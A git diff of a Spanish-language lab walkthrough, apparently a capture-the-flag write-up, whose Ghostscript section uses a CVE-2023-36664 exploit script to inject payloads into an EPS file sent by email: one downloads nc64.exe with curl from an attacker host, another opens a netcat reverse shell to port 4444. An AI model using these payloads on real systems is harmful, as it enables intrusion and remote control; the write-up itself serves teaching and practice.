@@ -189,7 +189,7 @@ después de buscar en internet encontramos un exploit [github](https://github.co
 
 
 ### Ghostscript
-para esto tambien necesitaremos el binario de nc64.exe que podemos bajar de github. con el primer comando vamos a cargar el binario nc64.exe al correo electronico. y con el segundo comando vamos a ejecutar el binario. todo esto es posible a 
+para esto tambien necesitaremos el binario de nc64.exe que podemos bajar de github. con el primer comando vamos a cargar el binario nc64.exe al correo electronico. y con el segundo comando vamos a ejecutar el binario. todo esto es posible a que el correo esta ejecutando codigo por detras gracias al exploit 
 ```python
 python3 CVE_2023_36664_exploit.py --inject --payload "curl 10.10.14.81:8000/nc64.exe -o nc.exe" --filename file.eps
 
@@ -198,3 +198,4 @@ python3 CVE_2023_36664_exploit.py --inject --payload "nc.exe 10.10.14.81 4444 -e
 ```
 
 ![[Pasted image 20240413004557.png]]
+
